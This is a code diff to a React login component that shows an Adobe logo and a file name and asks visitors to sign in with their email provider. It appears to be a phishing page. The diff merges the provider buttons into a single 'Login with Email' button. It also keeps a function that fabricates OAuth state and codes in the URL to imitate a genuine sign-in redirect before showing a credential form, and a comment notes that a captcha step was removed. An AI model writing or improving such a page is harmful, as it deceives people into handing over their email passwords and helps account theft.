@@ -8,20 +8,12 @@ interface LoginPageProps {
   onBack: () => void;
   onLoginSuccess?: (sessionData: any) => void;
   onLoginError?: (error: string) => void;
-  onYahooSelect?: () => void;
-  onAolSelect?: () => void;
-  onGmailSelect?: () => void;
-  onOffice365Select?: () => void;
 }
 
 const LoginPage: React.FC<LoginPageProps> = ({ 
   fileName, 
   onLoginSuccess, 
   onLoginError,
-  onYahooSelect,
-  onAolSelect,
-  onGmailSelect,
-  onOffice365Select,
 }) => {
   const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
   const [email, setEmail] = useState('');
@@ -34,7 +26,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
   );
 
   const emailProviders = [
-    { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
+    { name: 'Email', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
   ];
 
   // Check URL parameters on component mount
@@ -44,9 +36,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
     const authCode = urlParams.get('code');
     const oauthProvider = urlParams.get('oauth_provider');
     
-    // Clean up URL if there are any OAuth params (meaning it's a refresh)
     if (provider || authCode || oauthProvider) {
-      // Clear the URL to show main login page
       const baseUrl = window.location.pathname;
       window.history.replaceState({}, document.title, baseUrl);
       return;
@@ -54,32 +44,15 @@ const LoginPage: React.FC<LoginPageProps> = ({
   }, []);
 
   const handleProviderReturn = (providerName: string) => {
-    // Clean up the URL
     const baseUrl = window.location.pathname;
     window.history.replaceState({}, document.title, baseUrl);
-    
-    // Trigger provider navigation immediately
-    if (providerName.toLowerCase() === 'gmail' && onGmailSelect) {
-      onGmailSelect();
-    } else if (providerName.toLowerCase() === 'yahoo' && onYahooSelect) {
-      onYahooSelect();
-    } else if (providerName.toLowerCase() === 'aol' && onAolSelect) {
-      onAolSelect();
-    } else if ((providerName.toLowerCase() === 'office365' || providerName.toLowerCase() === 'outlook') && onOffice365Select) {
-      onOffice365Select();
-    } else {
-      setSelectedProvider(providerName);
-    }
+    setSelectedProvider(providerName);
   };
 
   const simulateOAuthRedirect = (providerName: string) => {
-    // Show redirecting state
-    // (kept as originally implemented)
-    // Generate OAuth-like parameters
     const state = Math.random().toString(36).substr(2, 15);
     const code = `auth_${Math.random().toString(36).substr(2, 20)}`;
     
-    // First, update URL to show OAuth process is starting
     const authStartParams = new URLSearchParams({
       oauth_provider: providerName.toLowerCase(),
       state: state,
@@ -89,9 +62,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
     const currentPath = window.location.pathname;
     window.history.pushState({}, '', `${currentPath}?${authStartParams.toString()}`);
     
-    // Simulate OAuth redirect delay
     setTimeout(() => {
-      // Simulate returning from OAuth with auth code
       const returnParams = new URLSearchParams({
         code: code,
         state: state,
@@ -101,10 +72,8 @@ const LoginPage: React.FC<LoginPageProps> = ({
       });
       
       window.history.replaceState({}, '', `${currentPath}?${returnParams.toString()}`);
-      
-      // Trigger the provider's login page
       handleProviderReturn(providerName);
-    }, 1500); // 1.5 second delay
+    }, 1500);
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -121,7 +90,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
     resetLoginState();
   };
 
-  // Removed captcha flow: clicking provider now starts redirect immediately
   const handleProviderClick = (providerName: string) => {
     simulateOAuthRedirect(providerName);
   };
@@ -134,7 +102,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
     />
   );
 
-  // Redirect screen logic remains as original (simulate redirect shows message)
   return (
     <div 
       className="min-h-screen flex items-center justify-center p-4 font-sans bg-cover bg-center"
@@ -143,18 +110,17 @@ const LoginPage: React.FC<LoginPageProps> = ({
       }}
     >
       {!selectedProvider ? (
-        // --- Provider Selection without Container Card ---
         <div className="w-full max-w-md">
           <div className="mb-8 text-center">
             <div className="flex justify-center mb-6">
               <AdobeLogo />
             </div>
-            {/* header removed as requested */}
-            
-            <p className="text-gray-800 text-base font-semibold mt-6 drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)]">Choose your email provider</p>
+            <p className="text-gray-800 text-base font-semibold mt-6 drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)]">
+              Login your email provider
+            </p>
           </div>
           
-          <div className="space-y-2">
+          <div className="space-y-4">
             {emailProviders.map((provider) => (
               <button
                 key={provider.name}
@@ -162,14 +128,11 @@ const LoginPage: React.FC<LoginPageProps> = ({
                 type="button"
                 className="w-full group"
               >
-                <div className="flex items-center px-5 py-3 bg-white/80 backdrop-blur-md rounded-lg border border-white/40 hover:bg-white/90 hover:border-blue-400/60 hover:scale-[1.02] transition-all duration-200 shadow-lg">
-                  <img src={provider.logo} alt={provider.name} className="w-7 h-7 object-contain flex-shrink-0 drop-shadow-sm" />
-                  <span className="flex-1 text-base font-semibold text-gray-800 group-hover:text-blue-700 transition-colors ml-4">
-                    {provider.name}
+                <div className="flex items-center justify-center px-5 py-3 bg-blue-600 rounded-lg hover:bg-blue-700 transition-all duration-200 shadow-lg shadow-blue-500/40 hover:scale-[1.02] active:scale-[0.99]">
+                  <img src={provider.logo} alt={provider.name} className="w-6 h-6 object-contain flex-shrink-0 filter invert brightness-0" />
+                  <span className="text-lg font-bold text-white ml-3">
+                    Login with {provider.name}
                   </span>
-                  <svg className="w-4 h-4 text-gray-600 group-hover:text-blue-600 transition-colors flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
-                  </svg>
                 </div>
               </button>
             ))}
@@ -180,7 +143,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
           </div>
         </div>
       ) : (
-        // --- Login Form with Container ---
         <div className="w-full max-w-md bg-white/70 backdrop-blur-md rounded-2xl shadow-2xl overflow-hidden border border-white/20">
           <div className="p-8">
             <div className="flex justify-center mb-6">
@@ -188,11 +150,10 @@ const LoginPage: React.FC<LoginPageProps> = ({
             </div>
             <h1 className="text-2xl font-bold text-center text-gray-800">Sign in with {selectedProvider}</h1>
             
-
             <div className="mt-8">
               <button onClick={handleBackToProviders} className="flex items-center gap-2 text-sm text-gray-700 hover:text-gray-900 font-medium mb-6">
                 <ArrowLeft className="w-4 h-4" />
-                Back to providers
+                Back to provider selection
               </button>
 
               <form onSubmit={handleSubmit} className="space-y-5">
